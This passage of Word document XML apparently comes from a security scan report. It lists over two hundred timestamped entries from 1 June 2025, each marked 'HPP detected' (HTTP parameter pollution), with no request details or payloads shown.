        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.599288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96. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:56:03.601418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97. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.201519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98. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.205364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99. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.208632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100. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.211571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101. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.214711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102. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.218299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103. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.221017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104. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.224169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105. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.227621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106. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.230279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107. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.233531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108. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.236337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109. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.239528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110. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.242720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111. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.245385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112. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.247509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113. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.249737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114. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.251857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115. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.253421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116. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.255542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117. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.257167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118. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.258779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119. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.260399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120. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.262515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121. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.264093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122. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.265691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123. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.267805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124. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.269400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125. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.271008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126. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.273166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127. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.274774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128. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T11:59:09.276376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129. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.007308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130. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.011012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131. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.014259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132. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.016958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133. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.020190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134. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.024035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135. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.026779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136. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.030518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137. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.033730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138. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.036377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139. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.040189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140. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.042848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141. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.046061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142. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.049276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143. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.052997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144. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.055168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145. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.057304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146. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.059392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147. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.061001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148. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.062612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149. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.064745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150. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.066321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151. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.068508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152. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.070098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153. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.071707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154. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.073311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155. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.075414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156. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.077342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157. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.079081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158. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.080881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159. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.082523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160. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:02:15.084779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161. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.819037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162. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.823411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163. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.826101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164. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.829368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165. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.833147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166. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.835868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167. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.839161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168. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.842901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169. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.845569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170. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.849248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171. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.852433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172. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.856175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173. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.859305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174. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.861988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175. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.865932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176. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.868079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177. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.870769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178. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.873281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179. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.874860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180. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.876996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181. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.879097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182. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.881225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183. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.883892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184. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.886005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185. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.888146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186. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.889743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187. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.891875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188. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.894548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189. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.896758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190. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.898356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191. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.900474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192. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:05:20.902577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193. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.504916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194. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.508653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195. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.511892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196. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.514648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197. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.518920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198. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.521619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199. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.524836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200. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.527504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201. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.531253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202. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.534453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203. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.538162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204. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.540278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205. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.544036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206. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.546718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207. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.550401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208. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.552520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209. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.554634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210. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.556243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211. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.558935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212. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.560962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213. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.562541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214. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.564419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215. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.566295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216. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.568429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217. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.570047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218. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.572181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219. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.573917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220. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.576133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221. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.578261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222. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.580180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223. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.582326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224. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:08:26.584468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225. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.309304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226. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.313065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227. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.316297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228. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.320097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229. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.323352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230. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.326580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231. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.329281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232. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.333056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233. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.336404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234. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.339046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235. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.343303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236. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.345991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237. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.349205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238. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.353163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239. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.356855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240. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.359500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241. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.361617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242. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.363442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243. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.365045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244. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.367272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245. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.369394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246. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.371553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247. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.373671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248. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.375095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249. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.377142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250. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.379003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251. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.380689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252. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.382918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253. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.385119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254. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.387244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255. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.389372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256. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:11:32.390992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257. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.672135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258. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.675996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259. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.679207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260. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.682434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261. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.685184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262. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.687863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263. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.690120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264. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.692764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265. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.695753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266. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.699214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267. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.702674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268. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.705712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269. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.708366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270. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.710921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271. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.714670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272. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.716531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273. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.719229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274. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.720839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275. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.722464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276. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.724592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277. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.726212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278. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.728341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279. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.730453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280. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.732702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281. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.734824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282. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.736416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283. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.738520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284. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.740134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285. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.741741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286. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.743837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287. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.745988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288. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:14:37.748096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289. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.084464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290. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.089774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291. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.092900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292. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.095748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293. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.100339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294. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.103582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295. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.107938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296. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.112122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297. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.116433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298. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.121013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299. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.125304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300. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.129030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301. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.133704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302. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.137493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303. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.141315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304. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.144509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305. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.146669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306. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.149357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307. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.151478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308. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.154214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309. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.156904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310. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.159055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311. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.160803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312. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.163508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313. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.165682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314. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.167892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315. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.170747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316. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.173424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317. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.175590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318. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.177717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319. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.179861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320. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:17:43.182578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321. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.368968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322. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.373211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323. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.376495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324. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.379763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325. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.384588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326. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.387848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327. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.391555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328. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.395289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329. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.399700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330. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.404376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331. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.409362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332. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.413737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333. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.416830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334. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.420593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335. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.424403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336. **HPP detected**</w:t>
        <w:br/>
        <w:t xml:space="preserve">   - Timestamp: 2025-06-01T12:20:48.427215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337. **HPP detected**</w:t>
